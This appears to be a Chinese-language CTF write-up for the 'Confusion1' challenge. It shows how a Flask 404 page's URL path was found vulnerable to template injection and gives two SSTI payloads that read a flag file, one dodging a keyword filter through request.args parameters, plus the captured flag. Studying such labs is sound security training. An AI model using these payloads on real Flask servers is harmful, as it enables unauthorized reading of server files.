# Confusion1

> flask ssti注入

## 思路分析

> 打开网址,登录页和注册页点击都是404,目录扫描没啥效果.陷入了死局,再次404后打开网页源码发现有提示,里面有flag文件的路径.找用户控制点,发现没有输入点,唯一可疑的就是404页中的请求路径,试下{{3+1}},发现返回信息中有4,说明存在ssti注入漏洞,这时发现网页后端是python flask写的,那么问题点是pyhon flask ssti注入点无疑了.直接输入payload会被过滤,提示选择其他方式.百度谷歌最后用request绕过.

## payload

>{{''.__class__.__mro__[2].__subclasses\[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').read()}}

> {{''[request.args.a][request.args.b][2]\[request.args.c]()\[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')\[request.args.d]()}}?a=\_\_class__&b=\_\_mro__&c=\_\_subclasses__&d=read


## flag

> cyberpeace{b0c8cc0f2ad804d08c32013cbd840d72}

## 参考

> https://blog.csdn.net/solitudi/article/details/107752717
> https://blog.csdn.net/miuzzx/article/details/110220425